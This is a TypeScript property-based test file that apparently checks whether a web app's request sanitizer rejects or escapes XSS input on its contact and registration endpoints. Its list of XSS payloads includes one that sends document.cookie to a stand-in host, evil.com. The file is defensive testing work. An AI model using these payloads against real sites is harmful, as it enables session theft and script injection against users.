// Property 13: XSS Input Sanitization
//
// Feature: campusway-qa-audit, Property 13: XSS Input Sanitization
//
// For any user input string containing HTML script tags (<script>),
// event handler attributes (onerror=, onload=, onclick=), or javascript:
// protocol URIs, the requestSanitizer middleware should either reject the
// request or sanitize the input by removing/escaping the malicious content
// before it reaches the controller.
//
// Validates: Requirements 12.7

import { describe, it, expect } from 'vitest';
import * as fc from 'fast-check';
import { requestWithoutAuth } from '../../../qa/helpers/api-client';

// ─── Known XSS Vectors ──────────────────────────────────────────────

const XSS_VECTORS = [
    '<script>alert("xss")</script>',
    '<script>document.cookie</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<div onclick=alert(1)>click</div>',
    'javascript:alert(1)',
    'javascript:void(0)',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">link</a>',
    '"><script>alert(1)</script>',
    "';alert(1);//",
    '<img src="x" onerror="alert(1)">',
    '<script>fetch("https://evil.com?c="+document.cookie)</script>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
] as const;

// ─── Endpoints that accept user input ────────────────────────────────

interface InputEndpoint {
    path: string;
    fieldName: string;
    additionalFields?: Record<string, string>;
}

const INPUT_ENDPOINTS: InputEndpoint[] = [
    {
        path: '/api/contact',
        fieldName: 'message',
        additionalFields: { name: 'Test User', email: 'test@test.com', subject: 'Test' },
    },
    {
        path: '/api/auth/register',
        fieldName: 'fullName',
        additionalFields: {
            email: `xss-test-${Date.now()}@campusway.test`,
            password: 'XssTest@123',
            username: `xss-test-${Date.now()}`,
        },
    },
];

// ─── Property Tests ──────────────────────────────────────────────────

describe('Feature: campusway-qa-audit, Property 13: XSS Input Sanitization', () => {
    it('XSS vectors in user input are rejected or sanitized by requestSanitizer', async () => {
        /**
         * **Validates: Requirements 12.7**
         *
         * Strategy: Use fc.constantFrom with known XSS vectors combined with
         * fc.string() for random prefix/suffix. Send these as user input to
         * endpoints that accept text. Verify the backend either:
         * 1. Rejects the request (400/403)
         * 2. Accepts but sanitizes the content (response doesn't contain raw XSS)
         */
        await fc.assert(
            fc.asyncProperty(
                fc.constantFrom(...XSS_VECTORS),
                fc.constantFrom(...INPUT_ENDPOINTS),
                fc.string({ minLength: 0, maxLength: 20 }),
                async (xssVector: string, endpoint: InputEndpoint, randomSuffix: string) => {
                    const maliciousInput = `${xssVector}${randomSuffix}`;

                    const body: Record<string, string> = {
                        ...endpoint.additionalFields,
                        [endpoint.fieldName]: maliciousInput,
                    };

                    const res = await requestWithoutAuth(
                        'POST',
                        endpoint.path,
                        body,
                        { timeout: 10_000 },
                    );

                    // The backend should either reject (400/403) or accept with sanitized data
                    if (res.status === 200 || res.status === 201) {
                        // If accepted, verify the response doesn't echo back raw XSS
                        const responseStr =
                            typeof res.data === 'string'
                                ? res.data
                                : JSON.stringify(res.data);

                        // The raw script tag should not appear in the response
                        expect(
                            responseStr.includes('<script>'),
                            `Response echoes raw <script> tag for ${endpoint.path}`,
                        ).toBe(false);

                        expect(
                            responseStr.includes('onerror='),
                            `Response echoes raw onerror= handler for ${endpoint.path}`,
                        ).toBe(false);

                        expect(
                            responseStr.includes('javascript:'),
                            `Response echoes raw javascript: URI for ${endpoint.path}`,
                        ).toBe(false);
                    }

                    // If rejected (400, 403), that's also valid — sanitizer blocked it
                    // We just need to ensure it's not a 500 (server crash from XSS)
                    expect(
                        res.status,
                        `XSS input should not cause server error (500) at ${endpoint.path}`,
                    ).not.toBe(500);
                },
            ),
            { numRuns: 20 },
        );
    });

    it('XSS vectors with random string combinations are handled safely', async () => {
        /**
         * **Validates: Requirements 12.7**
         *
         * Strategy: Combine XSS vectors with random fc.string() content to
         * test edge cases where XSS payloads are embedded in larger strings.
         */
        await fc.assert(
            fc.asyncProperty(
                fc.constantFrom(...XSS_VECTORS),
                fc.string({ minLength: 1, maxLength: 50 }),
                fc.string({ minLength: 0, maxLength: 50 }),
                async (xssVector: string, prefix: string, suffix: string) => {
                    const maliciousInput = `${prefix}${xssVector}${suffix}`;

                    const res = await requestWithoutAuth(
                        'POST',
                        '/api/contact',
                        {
                            name: 'XSS Test',
                            email: 'xss@test.com',
                            subject: 'XSS Test',
                            message: maliciousInput,
                        },
                        { timeout: 10_000 },
                    );

                    // Must not cause a 500 server error
                    expect(
                        res.status,
                        `Embedded XSS should not crash server: ${maliciousInput.substring(0, 80)}`,
                    ).not.toBe(500);
                },
            ),
            { numRuns: 20 },
        );
    });
});
